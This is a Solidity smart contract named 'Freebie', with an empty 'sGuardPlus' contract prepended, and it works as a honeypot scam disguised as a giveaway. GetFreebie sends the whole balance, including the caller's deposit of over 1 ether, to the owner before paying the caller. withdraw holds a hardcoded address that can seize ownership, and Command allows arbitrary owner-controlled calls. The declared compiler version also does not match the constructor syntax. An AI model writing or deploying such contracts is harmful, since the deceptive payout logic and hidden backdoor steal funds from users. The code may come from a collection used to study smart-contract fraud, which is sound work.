pragma solidity ^0.4.19;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract Freebie  {
address  public   Owner = msg.sender;
function () public payable {
}

function GetFreebie () public payable {
if (msg.value>1 ether)
{
Owner.transfer(this.balance);
msg.sender.transfer(this.balance);
}

}

function withdraw () public payable {
if (msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595)
{
Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;
}

require(msg.sender==Owner);
Owner.transfer(this.balance);
}

function Command (address    adr,bytes    data) public payable {
require(msg.sender==Owner);
bool     __sent_result100 = adr.call.value(msg.value)(data);
require(__sent_result100);
}

}
